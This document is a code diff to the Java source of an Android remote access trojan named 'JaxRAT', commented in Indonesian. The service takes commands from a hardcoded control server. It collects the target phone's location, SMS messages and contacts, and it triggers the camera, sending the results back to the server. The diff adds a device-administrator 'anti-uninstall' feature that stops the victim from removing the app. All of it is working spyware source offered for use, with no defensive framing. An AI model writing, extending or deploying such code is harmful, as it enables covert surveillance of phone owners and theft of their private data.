@@ -6,6 +6,8 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -34,7 +36,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class JaxRATService extends Service {
-    private static final String SERVER_URL = "http://192.168.1.20:5000"; 
+    private static final String SERVER_URL = "http://192.168.1.20:5000"; // SESUAIKAN IP
     private static final String DEVICE_ID = "hp_target_1"; 
     private static final String CHANNEL_ID = "JaxRAT_Channel";
     
@@ -126,30 +128,55 @@ public class JaxRATService extends Service {
             ambilGps();
         } else if (cmd.equals("get_sms")) {
             ambilSms();
-        } else if (cmd.equals("get_contacts")) { // <--- LOGIKA BARU KONTAK
+        } else if (cmd.equals("get_contacts")) {
             ambilKontak();
         } else if (cmd.equals("camera_front") || cmd.equals("camera_back")) {
             Intent camIntent = new Intent(this, CameraActivity.class);
             camIntent.putExtra("FRONT", cmd.equals("camera_front"));
             camIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(camIntent);
+        } 
+        // --- LOGIKA DEVICE ADMIN (ANTI-UNINSTALL) ---
+        else if (cmd.equals("anti_uninstall_on")) {
+            aktifkanAdmin();
+        } else if (cmd.equals("anti_uninstall_off")) {
+            matikanAdmin();
+        }
+    }
+
+    private void aktifkanAdmin() {
+        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        
+        if (!dpm.isAdminActive(adminComponent)) {
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan perlindungan JaxRAT untuk mencegah penghapusan.");
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
+    }
+
+    private void matikanAdmin() {
+        ComponentName adminComponent = new ComponentName(this, DeviceAdminReceiver.class);
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        
+        if (dpm.isAdminActive(adminComponent)) {
+            dpm.removeActiveAdmin(adminComponent);
         }
     }
 
     private void ambilKontak() {
         try {
             if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
-            
             JSONArray contactsArray = new JSONArray();
             Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-            
             if (cursor != null && cursor.moveToFirst()) {
                 int count = 0;
                 int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                 int phoneIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-                
                 do {
-                    if (count >= 50) break; // Ambil maksimal 50 aja biar gak berat
+                    if (count >= 50) break; 
                     JSONObject contact = new JSONObject();
                     contact.put("name", cursor.getString(nameIdx) != null ? cursor.getString(nameIdx) : "Tanpa Nama");
                     contact.put("phone", cursor.getString(phoneIdx));
@@ -158,7 +185,6 @@ public class JaxRATService extends Service {
                 } while (cursor.moveToNext());
                 cursor.close();
             }
-            
             kirimHasilKeWeb("contacts", contactsArray);
         } catch (Exception e) { Log.e("JAXRAT", "Gagal ambil kontak", e); }
     }
